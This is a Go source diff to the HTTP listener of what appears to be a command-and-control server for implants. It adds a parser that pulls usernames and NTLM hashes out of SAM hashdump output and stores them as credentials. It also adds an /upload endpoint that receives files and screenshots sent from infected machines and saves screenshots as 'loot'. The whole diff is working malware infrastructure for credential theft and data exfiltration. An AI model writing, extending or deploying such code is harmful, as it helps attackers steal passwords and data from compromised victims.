@@ -7,7 +7,9 @@ import (
 	"net/http"
 	"os"
 	"path/filepath"
+	"strings"
 	"sync"
+	"time"
 
 	"github.com/carved4/carved/server/pkg/db"
 	"github.com/carved4/carved/shared/proto"
@@ -47,6 +49,7 @@ func (m *Manager) Start(l *db.Listener) error {
 	hl.mux.HandleFunc("/beacon", hl.handleBeacon)
 	hl.mux.HandleFunc("/payloads/", hl.handlePayload)
 	hl.mux.HandleFunc("/chrome/result", hl.handleChromeResult)
+	hl.mux.HandleFunc("/upload", hl.handleUpload)
 
 	hl.mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
 		fmt.Printf("[!] Unmatched request: %s %s\n", r.Method, r.URL.Path)
@@ -60,7 +63,7 @@ func (m *Manager) Start(l *db.Listener) error {
 	}
 
 	go func() {
-		// TODO: HTTPS support - ListenAndServeTLS with cert/key paths
+
 		err := hl.server.ListenAndServe()
 		if err != nil && err != http.ErrServerClosed {
 			fmt.Printf("[!] Listener %s error: %v\n", l.Name, err)
@@ -190,6 +193,13 @@ func (hl *HTTPListener) handleBeacon(w http.ResponseWriter, r *http.Request) {
 			}
 			fmt.Printf("[+] Task %s completed: %s%s\n", result.TaskID[:8], result.Status, outputPreview)
 		}
+
+		if result.Status == proto.StatusComplete && len(result.Output) > 0 {
+			task, err := db.GetTask(result.TaskID)
+			if err == nil && task != nil && task.Type == proto.TaskHashdump {
+				parseHashdumpCredentials(beacon.ImplantID, string(result.Output))
+			}
+		}
 	}
 
 	tasks, err := db.GetPendingTasks(beacon.ImplantID)
@@ -285,6 +295,127 @@ func getString(m map[string]interface{}, key string) string {
 		}
 	}
 	return ""
+}
+
+func parseHashdumpCredentials(implantID string, output string) {
+	lines := strings.Split(output, "\n")
+	inSAMSection := false
+	inLSASection := false
+	var domain string
+
+	for _, line := range lines {
+		line = strings.TrimSpace(line)
+
+		if strings.HasPrefix(line, "Domain:") {
+			parts := strings.SplitN(line, ":", 2)
+			if len(parts) == 2 {
+				domainPart := strings.TrimSpace(parts[1])
+
+				if idx := strings.Index(domainPart, " ("); idx != -1 {
+					domainPart = domainPart[:idx]
+				}
+				domain = domainPart
+			}
+		}
+
+		if strings.Contains(line, "=== SAM Credentials ===") {
+			inSAMSection = true
+			inLSASection = false
+			continue
+		}
+		if strings.Contains(line, "=== LSA Secrets ===") {
+			inSAMSection = false
+			inLSASection = true
+			continue
+		}
+
+		if inSAMSection && line != "" && !strings.HasPrefix(line, "===") {
+			parts := strings.Split(line, ":")
+			if len(parts) >= 3 {
+				username := parts[0]
+				nthash := parts[2]
+
+				if nthash == "" || strings.Contains(nthash, "[") {
+					continue
+				}
+
+				cred := &db.Credential{
+					ImplantID:	implantID,
+					Source:		"hashdump/SAM",
+					Domain:		domain,
+					Username:	username,
+					Secret:		nthash,
+					Type:		"ntlm",
+					Created:	time.Now(),
+				}
+				if err := db.SaveCredential(cred); err != nil {
+					fmt.Printf("[!] Failed to save hashdump credential: %v\n", err)
+				} else {
+					fmt.Printf("[+] Saved credential: %s\\%s\n", domain, username)
+				}
+			}
+		}
+
+		if inLSASection && strings.HasPrefix(line, "Password:") {
+
+		}
+	}
+}
+
+func (hl *HTTPListener) handleUpload(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+
+	body, err := io.ReadAll(r.Body)
+	if err != nil {
+		http.Error(w, "bad request", http.StatusBadRequest)
+		return
+	}
+
+	uploadType := r.Header.Get("X-Upload-Type")
+	filename := r.Header.Get("X-Filename")
+	implantID := r.Header.Get("X-Implant-ID")
+
+	if filename == "" {
+		filename = fmt.Sprintf("upload_%d", time.Now().Unix())
+	}
+	if uploadType == "" {
+		uploadType = "file"
+	}
+
+	uploadDir := filepath.Join("uploads", uploadType+"s")
+	if err := os.MkdirAll(uploadDir, 0755); err != nil {
+		fmt.Printf("[!] Failed to create upload dir: %v\n", err)
+		http.Error(w, "internal error", http.StatusInternalServerError)
+		return
+	}
+
+	savePath := filepath.Join(uploadDir, filename)
+	if err := os.WriteFile(savePath, body, 0644); err != nil {
+		fmt.Printf("[!] Failed to save upload: %v\n", err)
+		http.Error(w, "internal error", http.StatusInternalServerError)
+		return
+	}
+
+	fmt.Printf("[+] Received %s from %s: %s (%d bytes)\n", uploadType, implantID, filename, len(body))
+
+	if uploadType == "screenshot" {
+		loot := &db.Loot{
+			ImplantID:	implantID,
+			Type:		db.LootScreenshot,
+			Name:		filename,
+			Data:		body,
+			Created:	time.Now(),
+		}
+		if err := db.SaveLoot(loot); err != nil {
+			fmt.Printf("[!] Failed to save loot: %v\n", err)
+		}
+	}
+
+	w.WriteHeader(http.StatusOK)
+	w.Write([]byte(`{"status":"ok"}`))
 }
 
 func (hl *HTTPListener) handlePayload(w http.ResponseWriter, r *http.Request) {
